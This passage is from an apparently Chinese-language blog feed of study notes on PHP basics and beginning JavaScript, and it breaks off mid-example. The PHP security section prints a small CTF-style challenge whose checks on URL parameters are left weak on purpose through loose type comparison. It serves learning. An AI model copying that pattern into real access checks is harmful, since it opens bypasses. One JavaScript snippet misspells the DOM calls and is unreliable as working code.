class="headerlink" title="十、命名空间"></a>十、命名空间</h1><p>命名空间通过关键字namespace 来声明。如果一个文件中包含命名空间，它必须在其它所有代码之前声明命名空间。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyProject</span> &#123;<br>    <span class="hljs-title class_">const</span> <span class="hljs-title class_">CONNECT_OK</span> = 1;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span> </span>&#123; <span class="hljs-comment">/* ... */</span> &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* ... */</span>  &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">AnotherProject</span> &#123;<br>    <span class="hljs-title class_">const</span> <span class="hljs-title class_">CONNECT_OK</span> = 1;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span> </span>&#123; <span class="hljs-comment">/* ... */</span> &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/* ... */</span>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="十一、面向对象"><a href="#十一、面向对象" class="headerlink" title="十一、面向对象"></a>十一、面向对象</h1><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><ul><li>类使用 <strong>class</strong> 关键字后加上类名定义。</li><li>类名后的一对大括号({})内可以定义变量和方法。</li><li>类的变量使用 <strong>var</strong> 来声明, 变量也可以初始化值。</li><li>函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Site</span> </span>&#123;<br>  <span class="hljs-comment">/* 成员变量 */</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$url</span>;<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$title</span>;<br>  <br>  <span class="hljs-comment">/* 成员函数 */</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setUrl</span>(<span class="hljs-params"><span class="hljs-variable">$par</span></span>)</span>&#123;<br>     <span class="hljs-variable language_">$this</span>-&gt;url = <span class="hljs-variable">$par</span>;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUrl</span>(<span class="hljs-params"></span>)</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;url . PHP_EOL;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setTitle</span>(<span class="hljs-params"><span class="hljs-variable">$par</span></span>)</span>&#123;<br>     <span class="hljs-variable language_">$this</span>-&gt;title = <span class="hljs-variable">$par</span>;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTitle</span>(<span class="hljs-params"></span>)</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;title . PHP_EOL;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$runoob</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Site</span>;<br><span class="hljs-variable">$taobao</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Site</span>;<br><span class="hljs-variable">$google</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Site</span>;<br><br><span class="hljs-comment">// 调用成员函数，设置标题和URL</span><br><span class="hljs-variable">$runoob</span>-&gt;<span class="hljs-title function_ invoke__">setTitle</span>( <span class="hljs-string">&quot;菜鸟教程&quot;</span> );<br><span class="hljs-variable">$taobao</span>-&gt;<span class="hljs-title function_ invoke__">setTitle</span>( <span class="hljs-string">&quot;淘宝&quot;</span> );<br><span class="hljs-variable">$google</span>-&gt;<span class="hljs-title function_ invoke__">setTitle</span>( <span class="hljs-string">&quot;Google 搜索&quot;</span> );<br><br><span class="hljs-variable">$runoob</span>-&gt;<span class="hljs-title function_ invoke__">setUrl</span>( <span class="hljs-string">&#x27;www.runoob.com&#x27;</span> );<br><span class="hljs-variable">$taobao</span>-&gt;<span class="hljs-title function_ invoke__">setUrl</span>( <span class="hljs-string">&#x27;www.taobao.com&#x27;</span> );<br><span class="hljs-variable">$google</span>-&gt;<span class="hljs-title function_ invoke__">setUrl</span>( <span class="hljs-string">&#x27;www.google.com&#x27;</span> );<br><br><span class="hljs-comment">// 调用成员函数，获取标题和URL</span><br><span class="hljs-variable">$runoob</span>-&gt;<span class="hljs-title function_ invoke__">getTitle</span>();<br><span class="hljs-variable">$taobao</span>-&gt;<span class="hljs-title function_ invoke__">getTitle</span>();<br><span class="hljs-variable">$google</span>-&gt;<span class="hljs-title function_ invoke__">getTitle</span>();<br><br><span class="hljs-variable">$runoob</span>-&gt;<span class="hljs-title function_ invoke__">getUrl</span>();<br><span class="hljs-variable">$taobao</span>-&gt;<span class="hljs-title function_ invoke__">getUrl</span>();<br><span class="hljs-variable">$google</span>-&gt;<span class="hljs-title function_ invoke__">getUrl</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="十二、包含文件"><a href="#十二、包含文件" class="headerlink" title="十二、包含文件"></a>十二、包含文件</h1><h2 id="include和require"><a href="#include和require" class="headerlink" title="include和require"></a>include和require</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;filename&#x27;</span>;<br>或者<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;filename&#x27;</span>;<br></code></pre></td></tr></table></figure><ul><li><p>require 一般放在 PHP 文件的最前面，程序在执行前就会先导入要引用的文件；</p></li><li><p>include 一般放在程序的流程控制中，当程序执行时碰到才会引用，简化程序的执行流程。</p></li><li><p>require 引入的文件有错误时，执行会中断，并返回一个致命错误；</p></li><li><p>include 引入的文件有错误时，会继续执行，并返回一个警告。</p></li></ul><h1 id="十三、文件处理"><a href="#十三、文件处理" class="headerlink" title="十三、文件处理"></a>十三、文件处理</h1><ul>    <li>fopen()——打开文件，$file=fopen("welcome.txt","r")</li>    <li>fclose()——关闭文件</li>    <li>fgets()——逐行读取,在调用该函数之后，文件指针会移动到下一行</li>    <li>fgetc()——逐字符读取，文件指针会移动到下一个字符</li>    <li>feof()——检测是否已到达文件末尾（EOF）,if(feof($file))</li>## 文件上传<ul><li>$_FILES[“file”] [“name”] - 上传文件的名称</li><li>$_FILES[“file”] [“type”] - 上传文件的类型</li><li>$_FILES[“file”] [“size”] - 上传文件的大小，以字节计</li><li>$_FILES[“file”] [“tmp_name”] - 存储在服务器的文件的临时副本的名称</li><li>$_FILES[“file”] [“error”] - 由文件上传导致的错误代码</li></ul><blockquote><p>补：_FILE[“file”] [“error”]</p><table><thead><tr><th><code>UPLOAD_ERR_OK</code> (0)</th><th>没有错误，文件上传成功。</th></tr></thead><tbody><tr><td><code>UPLOAD_ERR_INI_SIZE</code> (1)</td><td>上传的文件超过了 <code>php.ini</code> 中 <code>upload_max_filesize</code> 设置的值。</td></tr><tr><td><code>UPLOAD_ERR_FORM_SIZE</code> (2)</td><td>上传的文件超过了 HTML 表单中 <code>MAX_FILE_SIZE</code> 设置的值。</td></tr><tr><td><code>UPLOAD_ERR_PARTIAL</code> (3)</td><td>文件只被部分上传。</td></tr><tr><td><code>UPLOAD_ERR_NO_FILE</code> (4)</td><td>没有文件被上传。</td></tr><tr><td><code>UPLOAD_ERR_NO_TMP_DIR</code> (6)</td><td>缺少临时文件夹。</td></tr><tr><td><code>UPLOAD_ERR_CANT_WRITE</code> (7)</td><td>文件无法写入磁盘。</td></tr><tr><td><code>UPLOAD_ERR_EXTENSION</code> (8)</td><td>文件上传被 PHP 扩展阻止。</td></tr></tbody></table></blockquote><h1 id="十四、COOKIE"><a href="#十四、COOKIE" class="headerlink" title="十四、COOKIE"></a>十四、COOKIE</h1><h2 id="创建cookie"><a href="#创建cookie" class="headerlink" title="创建cookie"></a>创建cookie</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">setcookie</span>(name, value, expire, path, domain);<br></code></pre></td></tr></table></figure><p><code>setcookie()</code> 是 PHP 中用于向客户端设置 Cookie 的函数。它的参数如下：</p><ul><li><strong>name</strong>: 要设置的 Cookie 的名称。</li><li><strong>value</strong>: Cookie 的值。</li><li><strong>expire</strong>: 可选参数，Cookie 过期的时间，是一个 Unix 时间戳。</li><li><strong>path</strong>: 可选参数，指定在服务器的哪个路径下 Cookie 是有效的。</li><li><strong>domain</strong>: 可选参数，指定在哪个域名下 Cookie 是有效的。</li></ul><blockquote><p>setcookie() 函数必须位于 <html> 标签之前</p></blockquote><h2 id="取回cookie"><a href="#取回cookie" class="headerlink" title="取回cookie"></a>取回cookie</h2><p>$_COOKIE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<span class="hljs-comment">//输出cookie值</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$_COOKIE</span>);<span class="hljs-comment">//查看所有cookie</span><br></code></pre></td></tr></table></figure><h2 id="删除cookie"><a href="#删除cookie" class="headerlink" title="删除cookie"></a>删除cookie</h2><p>将时间改为过去的时间就可以了</p><h1 id="错误合集"><a href="#错误合集" class="headerlink" title="错误合集"></a>错误合集</h1><p><img src="D:\HEXO\hexo-blog\source_posts\PHP学习\parse_error.png" alt="image-20250305220125233"></p><p><img src="D:\HEXO\hexo-blog\source_posts\PHP学习\UTF-8_error.png" alt="UTF-8_error"></p><p>写完代码发现打开网站是乱码，想到应该是编码方式的问题，查阅知大部分浏览器是UTF-8的编码而刚写的my.php文件是ANSI编码格式，这里我用记事本将文件打开，在另存为界面将编码方式改为UTF-8覆盖原来的文件，再次打开就可以正常显示了(作者也不知道为何编码方式会变成ANSI……)</p><p>资源库：<a href="https://www.code-nav.cn/">https://www.code-nav.cn/</a></p><p>vs code插件：<a href="https://blog.csdn.net/qq_38698753/article/details/93190356">https://blog.csdn.net/qq_38698753/article/details/93190356</a></p><p>书籍：<a href="https://github.com/yayxs/bilibili-video-tutorial/tree/books-share">https://github.com/yayxs/bilibili-video-tutorial/tree/books-share</a></p><h1 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h1><h2 id="1-弱类型"><a href="#1-弱类型" class="headerlink" title="1.弱类型"></a>1.弱类型</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">﻿<span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-variable">$a</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$a</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag1</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>&gt;<span class="hljs-number">1234</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag2</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li><p>&#x3D;&#x3D;是不严格比较，会先进行类型转换，再进行比较</p></li><li><p>&#x3D;&#x3D;&#x3D;严格比较，其会比较数据类型</p></li><li><p><code>is_numeric</code>——其会判断参数是否为数字或数字字符串，若是则返回true，反之返回false;</p></li><li><p>数字加字母转换为整数时，会直接去掉字母</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript学习</title>
    <link href="/2025/03/01/JavaScript%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/01/JavaScript%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="一、JavaScript输出"><a href="#一、JavaScript输出" class="headerlink" title="一、JavaScript输出"></a>一、JavaScript输出</h1><blockquote><p>注：便于写笔记，JavaScript全是写在HTML文档中的</p></blockquote><h2 id="1-使用window-alert"><a href="#1-使用window-alert" class="headerlink" title="1.使用window.alert()"></a>1.使用window.alert()</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我的第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">alert</span>(<span class="hljs-number">5</span> + <span class="hljs-number">6</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-操作HTML元素"><a href="#2-操作HTML元素" class="headerlink" title="2.操作HTML元素"></a>2.操作HTML元素</h2><p>如需从 JavaScript 访问某个 HTML 元素，您可以document.getElementById(<em>id</em>) 方法。请使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容</p><p>eg:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span>第一次使用document.getElementByid<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">getElement</span>.<span class="hljs-title class_">Byid</span>(<span class="hljs-string">&quot;demo&quot;</span>).<span class="hljs-property">innerHEML</span>=<span class="hljs-string">&quot;恭喜你学会了&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3-document-write"><a href="#3-document-write" class="headerlink" title="3. document.write()"></a>3. document.write()</h2><p>可向文档中写入内容</p><p>eg:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">Date</span>());</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>补：如在文档完成加载后执行document.write(),整个HTML页面将被覆盖</p><p>eg:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的第一个 Web 页面<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我的第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;myFunction()&quot;</span>&gt;</span>点我<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunction</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">   <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">Date</span>());</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以自己新建一个html的文档试试效果</p></blockquote><h2 id="4-写到控制台"><a href="#4-写到控制台" class="headerlink" title="4.写到控制台"></a>4.写到控制台</h2><p>JavaScript程序可以在console进行调试，减少bug出现</p><h1 id="二、JavaScript语法"><a href="#二、JavaScript语法" class="headerlink" title="二、JavaScript语法"></a>二、JavaScript语法</h1><h2 id="1-字面量"><a href="#1-字面量" class="headerlink" title="1.字面量"></a>1.字面量</h2><ul><li>数字字面量：可以是整数、小数或者科学计数法（e），eg：3.14，123e5</li><li>字符串字面量：可以使用单引号或者双引号，eg：”java”或者’java’</li><li>表达式字面量：用于计算，eg：5+6</li><li>数组字面量：定义一个数组，eg：[40,100,2]</li><li>对象字面量：第一一个对象，eg：{firstname:”java”, lastname:”‘hello’}</li><li>函数字面量：定义一个函数，eg：function myFunction(a,b){return a*b;}</li></ul><h2 id="2-变量"><a href="#2-变量" class="headerlink" title="2.变量"></a>2.变量</h2><p>注：JavaScript对大小写敏感</p><p>使用var定义变量，使用等号赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x,y;<br>x=<span class="hljs-number">2</span>;<br>y=<span class="hljs-number">3</span>;<br><span class="hljs-comment">//也可以在声明时对其进行赋值</span><br><span class="hljs-keyword">var</span> z=<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p>未赋值的变量将是undefined</p><p><strong>如果重新声明 JavaScript 变量，该变量的值不会丢失</strong></p><p>eg：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> a=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">var</span> a;<br><span class="hljs-comment">//a的值还是1</span><br></code></pre></td></tr></table></figure><h2 id="3-操作符"><a href="#3-操作符" class="headerlink" title="3.操作符"></a>3.操作符</h2><ol><li>算术运算符：+ - * &#x2F;</li><li>赋值运算符：&#x3D;</li><li>其他：位运算符，条件运算符，比较运算符，逻辑运算符</li></ol><h2 id="4-语句"><a href="#4-语句" class="headerlink" title="4.语句"></a>4.语句</h2><p>JavaScript语句用于向浏览器发送命令，语句用<strong>分号隔开</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">x=<span class="hljs-number">1</span>+<span class="hljs-number">2</span>;<br>y=<span class="hljs-number">2</span>+<span class="hljs-number">3</span>;<br><span class="hljs-comment">//另一个好处是使用分号可以一行编写多条语句</span><br>x=<span class="hljs-number">1</span>;y=<span class="hljs-number">2</span>;z=<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p>语句标识符：</p><p><img src="D:\HEXO\hexo-blog\source_posts\JavaScript学习\语句标识符.png" alt="image-20250301162842320"></p><p><strong>JavaScript会忽略多余空格，可以向脚本中添加空格增加可读性</strong></p><p><strong>可以在文本字符串中使用反斜杠对代码进行换行</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//如下</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;hello \ world&quot;</span>)<span class="hljs-comment">//这是正确用法</span><br></code></pre></td></tr></table></figure><h2 id="5-关键字"><a href="#5-关键字" class="headerlink" title="5.关键字"></a>5.关键字</h2><p>太多了……</p><h2 id="6-注释"><a href="#6-注释" class="headerlink" title="6.注释"></a>6.注释</h2><p>使用**&#x2F;&#x2F;**双斜杠进行注释</p><p><strong>多行</strong>注释可用**&#x2F;* *&#x2F;**实现</p><h2 id="7-数据类型"><a href="#7-数据类型" class="headerlink" title="7.数据类型"></a>7.数据类型</h2><p>**值类型(基本类型)**：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol。</p><p><strong>引用数据类型（对象类型）</strong>：对象(Object)、数组(Array)、函数(Function)，还有两个特殊的对象：正则（RegExp）和日期（Date）。</p><blockquote><p><strong>注：</strong>*Symbol 是 ES6 引入了一种新的原始数据类型，表示独一无二的值。</p><p>布尔：只有两个值true或false</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x=<span class="hljs-literal">true</span>;<br><span class="hljs-keyword">var</span> y=<span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure></blockquote><p>JavaScript拥有动态类型，意味着相同变量可以用作不同的类型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x;<br><span class="hljs-keyword">var</span> x=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">var</span> x=<span class="hljs-string">&quot;java&quot;</span><br></code></pre></td></tr></table></figure><p>变量类型可用typeof操作符来查看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-string">&quot;John&quot;</span>                <span class="hljs-comment">// 返回 string</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-number">3.14</span>                  <span class="hljs-comment">// 返回 number</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">false</span>                 <span class="hljs-comment">// 返回 boolean</span><br><span class="hljs-keyword">typeof</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]             <span class="hljs-comment">// 返回 object</span><br><span class="hljs-keyword">typeof</span> &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;John&#x27;</span>, <span class="hljs-attr">age</span>:<span class="hljs-number">34</span>&#125; <span class="hljs-comment">// 返回 object</span><br></code></pre></td></tr></table></figure><h3 id="数组："><a href="#数组：" class="headerlink" title="数组："></a>数组：</h3><p>下面的代码创建名为 cars 的数组：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> cars=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();<br>cars[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;Saab&quot;</span>;<br>cars[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;Volvo&quot;</span>;<br>cars[<span class="hljs-number">2</span>]=<span class="hljs-string">&quot;BMW&quot;</span>;<br><span class="hljs-comment">//或者</span><br><span class="hljs-keyword">var</span> cars=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-string">&quot;Saab&quot;</span>,<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="对象："><a href="#对象：" class="headerlink" title="对象："></a>对象：</h3><p>对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> person=&#123;<span class="hljs-attr">firstname</span>:<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">lastname</span>:<span class="hljs-string">&quot;Doe&quot;</span>, <span class="hljs-attr">id</span>:<span class="hljs-number">5566</span>&#125;;<br><span class="hljs-comment">//对象属性的两种寻址方式</span><br>name=person.<span class="hljs-property">lastname</span>;<br>name=person[<span class="hljs-string">&quot;lastname&quot;</span>];<br></code></pre></td></tr></table></figure><h3 id="Undefined"><a href="#Undefined" class="headerlink" title="Undefined"></a>Undefined</h3><p>这个值表示变量不含有值。可以通过将变量的值设置为 null 来清空变量。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">cars=<span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>可以使用索引位置访问字符串中的每个字符</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span>hhh<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span 